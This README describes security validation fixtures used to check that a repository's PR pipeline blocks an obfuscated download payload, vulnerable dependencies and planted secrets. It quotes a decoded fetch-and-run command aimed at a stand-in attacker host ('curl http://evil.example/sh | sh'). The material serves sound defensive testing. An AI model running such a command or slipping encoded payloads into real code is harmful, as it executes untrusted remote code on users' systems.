# Security validation fixtures

These files are **intentionally malicious-looking samples** used only to
validate that the PR security pipeline blocks real attacks. They are not real
code — **do not execute them.** This directory is excluded from the obfuscation
scan (see `.github/scripts/obfuscation-scan.mjs` `SKIP_PATHS`) so the fixture
itself does not trip the detector when committed.

## How to use

Open a throwaway PR that adds one of these signals (or all three together) and
confirm the pipeline blocks it before merge (Success Criterion SC1 in the plan):

1. **Encoded-download payload** — copy the line from `encoded-payload.example`
   into a source file in the PR. The obfuscation scan should fail, decoding the
   blob to `curl http://evil.example/sh | sh`.
2. **Vulnerable dependency** — add a package with an active GHSA advisory at or
   above `high` to `package.json`. Dependency review should fail.
3. **Planted secret** — push a fake token (e.g. a dummy AWS/GitHub token). Push
   protection should block it at push, before the PR even opens.

A normal bug-fix PR should still merge with only approve-and-run + approval.
